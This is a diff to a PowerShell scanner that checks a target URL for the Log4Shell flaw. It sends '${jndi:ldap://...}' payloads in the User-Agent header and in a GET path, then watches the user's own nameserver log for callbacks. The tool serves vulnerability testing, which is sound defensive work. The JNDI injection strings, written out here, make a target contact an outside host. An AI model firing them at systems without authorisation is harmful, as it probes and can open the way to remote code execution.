@@ -33,6 +33,7 @@ if (!$args[0]) {
     Exit
 } else {
     $target = $args[0]
+    $id = ([System.Uri]$target).Host -replace '^www\.'
     Write-Host ("Scanning target: {0}" -f $target)
 }
 
@@ -54,10 +55,10 @@ public class TrustAllCertsPolicy : ICertificatePolicy {
 # Inspired by: https://gist.github.com/byt3bl33d3r/46661bc206d323e6770907d259e009b6
 
 Write-Host "-- CHECK 1 --" -ForegroundColor red -BackgroundColor white
-Write-Host "Sending request to $target using User-Agent injection..." -ForegroundColor red -BackgroundColor white
+Write-Host "Sending request to $target using User-Agent injection..."
 
 $uar = $null
-$JsonHeader = @{ 'User-Agent' = '${jndi:ldap://check1.' + $($NameServer) + '/test.class}' }
+$JsonHeader = @{ 'User-Agent' = '${jndi:ldap://' + $($id) + '-1.' + $($NameServer) + '/test.class}' }
 try {
     $uar = Invoke-WebRequest $target -Headers $JsonHeader
 }catch {
@@ -69,10 +70,10 @@ try {
 # Check 2 (Get Request)
 
 Write-Host "-- CHECK 2 --" -ForegroundColor red -BackgroundColor white
-Write-Host "Sending request to $target using GET request injection..." -ForegroundColor red -BackgroundColor white
+Write-Host "Sending request to $target using GET request injection..."
 
 $gr = $null
-$GetParam = ('${jndi:ldap://check2.' + $NameServer + '/test.class}')
+$GetParam = ('${jndi:ldap://' + $id + '-2.' + $NameServer + '/test.class}')
 try {
     $gr = Invoke-WebRequest ( $target + "/" + $GetParam )
 }catch {
@@ -91,5 +92,5 @@ if ($Proxy) {
 # '/var/log/named/query.log' for incoming requests.
 # If there is a request, the $target is vulnerable!
 
-Write-Host "Check /var/log/named/query.log on your NameServer." -ForegroundColor red -BackgroundColor white
-Write-Host "Incoming connection from your target means vulnerable!" -ForegroundColor red -BackgroundColor white
+Write-Host "Check /var/log/named/query.log on your NameServer."
+Write-Host "Incoming connection from your target means vulnerable!"
